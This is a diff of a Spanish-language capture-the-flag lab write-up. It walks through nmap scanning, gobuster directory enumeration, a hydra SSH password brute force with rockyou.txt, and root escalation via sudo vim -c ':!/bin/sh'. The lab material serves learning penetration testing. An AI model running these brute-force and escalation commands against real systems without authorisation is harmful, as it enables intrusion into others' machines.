@@ -26,9 +26,9 @@ El objetivo principal fue identificar servicios activos, realizar enumeración, 
 
 ### 1. Verificar conectividad con ping
 
-\`\`\`
-ping -c 4 172.18.0.2
-\`\`\`
+
+    ping -c 4 172.18.0.2
+
 
 ![Ping a la IP](screenshots/ping.PNG)
 
@@ -38,9 +38,9 @@ Se confirmó que el objetivo responde a la red.
 
 ### 2. Escaneo completo de puertos con Nmap
 
-\`\`\`
-nmap -sV -sC -p- 172.18.0.2 --open -oN scanPuertos.txt
-\`\`\`
+
+    nmap -sV -sC -p- 172.18.0.2 --open -oN scanPuertos.txt
+
 
 ![escaneo](screenshots/escaneo.PNG)
 
@@ -55,9 +55,9 @@ Vemos que tiene el puerto 80 mediante el navegador
 
 ### 3. Enumeración de directorios HTTP con Gobuster
 
-\`\`\`
-gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://172.18.0.2 -x php,html,xml,txt,json
-\`\`\`
+
+    gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://172.18.0.2 -x php,html,xml,txt,json
+
 
 Se descubrió el archivo \`secret.php\`.
 
@@ -67,7 +67,7 @@ Se descubrió el archivo \`secret.php\`.
 
 ### 4. Análisis del archivo \`secret.php\`
 
-Al visitar \`http://172.18.0.2/secret.php\` encontramos un nombre: **Mario**.
+Al visitar `http://172.18.0.2/secret.php\` encontramos un nombre: **Mario**.
 
 ![Nombre](screenshots/mario.PNG)
 
@@ -77,9 +77,9 @@ Al visitar \`http://172.18.0.2/secret.php\` encontramos un nombre: **Mario**.
 
 Intentamos acceder vía SSH con el usuario \`mario\` usando el diccionario \`rockyou.txt\`:
 
-\`\`\`
-hydra -l mario -P /usr/share/wordlists/rockyou.txt -v ssh://172.18.0.2
-\`\`\`
+
+    hydra -l mario -P /usr/share/wordlists/rockyou.txt -v ssh://172.18.0.2
+
 
 Se logró obtener la contraseña correcta.
 
@@ -89,7 +89,7 @@ Se logró obtener la contraseña correcta.
 
 ### 6. Acceso vía SSH
 
-Conectamos exitosamente a la máquina como usuario \`mario\`.
+Conectamos exitosamente a la máquina como usuario `mario\`.
 
 ![SHH](screenshots/conexionSSH.PNG)
 
@@ -99,11 +99,11 @@ Conectamos exitosamente a la máquina como usuario \`mario\`.
 
 Ejecutamos:
 
-\`\`\`
-sudo -l
-\`\`\`
 
-Se observó que \`mario\` puede ejecutar \`vim\` con privilegios de root sin contraseña.
+    sudo -l
+
+
+Se observó que `mario\` puede ejecutar `vim\` con privilegios de root sin contraseña.
 
 ![escala](screenshots/escalada.PNG)
 
@@ -115,9 +115,9 @@ Usando la técnica encontrada en [GTFOBins - Vim](https://gtfobins.github.io/), 
 
 ![escalada](screenshots/escaladavim.PNG)
 
-\`\`\`
-sudo vim -c ':!/bin/sh'
-\`\`\`
+
+    sudo vim -c ':!/bin/sh'
+
 
 ![accesoRoot](screenshots/accesoRoot.PNG)
 
